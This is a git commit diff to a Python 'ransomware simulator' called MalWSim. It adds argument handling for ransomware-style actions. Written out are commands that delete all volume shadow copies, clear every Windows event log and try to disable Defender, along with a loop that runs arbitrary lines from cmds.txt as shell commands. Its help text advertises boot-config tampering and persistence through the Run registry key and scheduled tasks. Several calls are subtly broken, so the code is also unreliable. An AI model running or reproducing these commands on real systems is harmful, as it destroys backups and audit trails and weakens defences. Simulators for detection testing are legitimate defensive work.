358df64c6d4e2af39fa8b1b1b4d7187fe0b9fa51
Tuutaans <07tutaans@gmail.com>
2023-02-25 17:03:14 +0545

    Added Help option

--- MalWSim.py
+++ MalWSim.py
@@ -1,21 +1,25 @@
 import os
+import sys
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
-
+import pyfiglet
 
 
 def create_setup():
     directory_name = "test_directory"
     file_name = "test_file"
 
-    for i in range(1,6):
-        if not os.path.exists(directory_name):
-            create_dir = directory_name + "_" + str(i)
+    for i in range(1, 6):
+        create_dir = directory_name + "_" + str(i)
+        if not os.path.exists(create_dir):
             os.makedirs(create_dir)
-            for j in range(1,11):
-                with open(os.path.join(create_dir, f"{file_name}_{j}.txt"), "w") as f:
-                    f.write("Random test data for ransomware simulator " + str(i) + " " + str(j) )
+            for j in range(1, 11):
+                file_path = os.path.join(create_dir, f"{file_name}_{j}.txt")
+                if not os.path.exists(file_path):
+                    with open(file_path, "w") as f:
+                        f.write("Random test data for ransomware simulator " + str(i) + " " + str(j))
+
 
 dirs = "test_directory_"
 file = "test_file"
@@ -46,6 +50,9 @@ def encrypt_file():
             except:
                 continue
 
+def help_func():
+    pass
+
 
 def shadow_copy_delete():
     os.system("vssadmin.exe delete shadows /all /quiet")
@@ -67,13 +74,61 @@ def schedule_task():
 
 
 def defender_disable():
+    os.system('Set-MpPreference -DisableRealtimeMonitoring $false')
     pass
 
 def log_clear_wevtutil():
     os.system('wevtutil el | Foreach-Object {wevtutil cl "$_"}')
 
-def additional_commands(): #Takes commands from user and execute it 
-    pass
 
-create_setup()
-encrypt_file()
+def additional_commands(): #Loads cmds.txt file and execute command 
+    try:
+        with open("cmds.txt", "r") as f:
+
+            # Iterate over each line of the file
+            for line in f:
+
+                # Execute each line as Python code
+                print(os.system(line))
+    except:
+        pass
+
+def help_func():
+    print(pyfiglet.figlet_format('MalWSim'))
+    options = """
+    --shadow-del      Use To delete shadow copy
+    --clear-log       Clear logs using wevtutil
+    --disable-def     Disables Defender via Poweshell
+    --bcd-modify      Modifies boot config data to disable auto recovery
+    --autorun-modify  Places the scripts at Run registry
+    --task-schedule   Schedules the script to be executed at every 30 min
+    """
+    return options
+
+def runner(): # Handle user input here to execute various commands and function:
+    if len(sys.argv) <= 1:
+        print(help_func())
+
+    for i in range(1,len(sys.argv)):
+        if sys.argv[i] == "--shadow-del":
+            shadow_copy_delete()
+        if sys.argv[i] == "--clear-log":
+            log_clear_wevtutil
+        if sys.argv[i] == "--disable-def":
+            defender_disable
+        if sys.argv[i] == "--bcd-modify":
+            boot_config_mod
+        if sys.argv[i] == "--autorun-modify":
+            autorun_modify
+        if sys.argv[i] == "--task-schedule":
+            schedule_task
+        if sys.argv[i] == "--help" or sys.argv[i] == "-h":
+            print(help_func())
+        else:
+            try:
+                create_setup()
+                encrypt_file()
+            except:
+                print("File and folder related error")
+
+runner()
